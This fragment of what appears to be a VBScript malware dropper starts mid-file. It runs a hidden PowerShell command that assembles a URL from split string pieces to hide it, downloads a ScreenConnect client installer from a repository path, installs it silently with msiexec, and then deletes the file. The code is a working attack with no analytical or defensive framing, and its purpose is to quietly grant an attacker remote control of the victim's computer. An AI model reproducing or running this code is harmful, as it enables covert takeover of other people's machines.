...
P="powershell -nop -c ""$c=New-Object Net.WebClient;$u='ht'+'tps://'+'"+D+"'+'/lordcrowleyco-alt/new/raw/refs/heads/main/ScreenConnect.ClientSetup.msi';$c.DownloadFile($u,'"+T+"')"""
W.Run P,0,1
If F.FileExists(T) Then W.Run "msiexec /i """&T&""" /qn /norestart",0,1:F.DeleteFile Ts